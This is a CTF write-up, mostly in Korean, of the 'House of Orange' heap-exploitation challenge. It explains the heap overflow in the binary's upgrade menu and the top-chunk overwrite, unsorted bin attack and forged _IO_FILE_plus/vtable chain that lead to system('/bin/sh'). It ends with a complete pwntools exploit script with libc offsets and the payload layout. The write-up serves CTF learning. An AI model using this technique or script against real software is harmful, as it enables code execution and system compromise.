House of Orange - 500 (pwn)
=============

### 1. Introduction

| RELRO      | STACK CANARY | NX         | PIE         | RPATH    | RUNPATH    | FILE          |
|------------|--------------|------------|-------------|----------|------------|---------------|
| Full RELRO | Canary found | NX enabled | PIE enabled | No RPATH | No RUNPATH | houseoforange |

64 bit binary이며 모든 보호기법이 걸려있다.


### 2. Reversing
```c
// house struct 
struct house
{
  orange *orange;
  char *house_name;
};

// orange struct
struct orange
{
  __int32 price_of_orange;
  __int32 value;
};
```

1. Build the house
- 최대 0x1000 size로 할당할 수 있으며 *house_name에 입력받는다. 또한 orange의 가격과 value를 입력받는다. (최대 3개까지 만들 수 있음)

2. See the house
- 현재 만든 집의 정보를 보여준다. (house name, price_of_orange, orange)

3. Upgrade the house
- 현재 만든 집을 0x1000까지 size를 입력하여 house name, price_of_orange, value를 수정할 수 있다. 

### 3. Vulnerability

Upgrade 메뉴 에서 heap overflow가 발생한다.

### 4. Exploit

1. Top Chunk를 페이지정렬이 된 가장 작은 사이즈로 overwrite한다.
    - Top chunk가 0x20f01이라면 0xf01로 덮어주면 된다.
2. Top Chunk보다 더 큰 size로 할당한다.
    - malloc이 이 요청을 처리하기 위하여 sysmalloc을 호출하는데 이 과정에서 _int_free()에 의해 Top chunk - 0x8이 unsorted bin에 등록된다.
3. Fake struct _IO_FILE_plus를 만들어준다.
    - _mode > 0
    - vtable = fake vtable
    - _wide_data = fake wide data 
```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```
```c
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
```
```c
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION && _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t _freeres_size;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;
  size_t __pad5;
# endif
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};
```  
4. Fake struct _IO_wide_data 를 만들어준다.   
    - _IO_write_ptr > _IO_write_base
```c
//_IO_OVERFLOW를 실행시키기 위한 조건

#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
#endif
```
```c
/* Extra data for wide character streams.  */
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;   /* Start of putback+get area. */
  wchar_t *_IO_write_base;  /* Start of put area. */
  wchar_t *_IO_write_ptr;   /* Current put pointer. */
  wchar_t *_IO_write_end;   /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;     /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;   /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base; /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
 
  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
 
  wchar_t _shortbuf[1];
 
  const struct _IO_jump_t *_wide_vtable;
};
```
5. Unsorted bin attack
    - free chunk의 bk에 &_IO_list_all - 0x10 값을 덮어쓴다
    - free chunk를 smallbin[4]에 등록하기 위해 사이즈를 바꾼다. (90 ~ 98)
    - 새로운 힙을 할당한다.

6. File-stream oriented programming
    - IO_list_all에 main_arena + 88의 값을 덮어쓴다. (unsorted bin attack)
    - malloc 메모리 손상이 발상하여 _IO_flush_all_lockp 함수를 실행한다.
    - _IO_flush_all_lockp은 IO_list_all에(main_arena + 88)를 이용한다.
    - 'fp = fp→_chain' 때문에 fp가 Fake _IO_FILE_plus 구조체로 변경된다.
    - _IO_flush_all_lockp() 함수는 _wide_data에 _IO_write_ptr > _IO_write_base조건이 충족하면 _IO_OVERFLOW 함수를 호출한다.
    - 함수가 호출될 때 fake vtable을 이용하므로 system함수를 실행시킬 수 있으며 인자로 들어가는 fp를 "/bin/sh"로 맞춰주면 exploit에 성공한다.
    
```python
from pwn import *

s = process('./houseoforange')

def build(namelen, name, price, color):
	s.sendlineafter('Your choice : ','1')
	s.sendlineafter('Length of name :',namelen)
	s.sendafter('Name :', name)
	s.sendlineafter('Price of Orange:',price)
	s.sendlineafter('Color of Orange:',color)

def edit(namelen, name, price , color):
	s.sendlineafter('Your choice : ','3')
	s.sendlineafter('Length of name :',namelen)
	s.sendlineafter('Name:', name)
	s.sendlineafter('Price of Orange:',price)
	s.sendlineafter('Color of Orange:',color)

def see():
	s.sendlineafter('Your choice : ','2')

pause()
build(str(0x28),'A' * 0x28,'1','1')

# top chunk size - 20f91
# heap overflow
edit(str(0x58),'B'*0x48 + p64(0xf91) ,'1', '1')

build(str(0x1000),'B' * 8,'1','1')
build(str(0x400),'B' * 8,'1','1')

# libc & heap leak
see()
s.recvuntil('B' * 8)
libc_base = u64(s.recv(6) + "\x00" * 2) - 0x3c5188
iolistall = libc_base + 0x3c5520
system = libc_base +  0x45390

edit(str(0x11),'B' * 0x10,'1', '1')
see()
s.recvuntil('B' * 0x10)
heap_base = u64(s.recv(6) + "\x00" * 2) - 0xa

log.info("LIBC_BASE : " + hex(libc_base))
log.info("HEAP_BASE : " + hex(heap_base))
log.info("IO_LIST_ALL : " + hex(iolistall))

# make fake struct
payload = 'B' * 0x420
payload += '/bin/sh\x00' + p64(0x61) + 'A' * 8 + p64(iolistall-0x10)
payload += p64(0) * 0x3 + p64(1) + p64(2) + p64(0) * 11
payload += p64(heap_base + 0x520) + p64(0) * 3 + p64(1) + p64(0) * 2 +p64(heap_base + 0x618)
payload += p64(system) * 0x40

edit(str(0x1000),payload,'1', '1')

s.interactive()
```
    
    
    
    
    
    
    
    
    
    
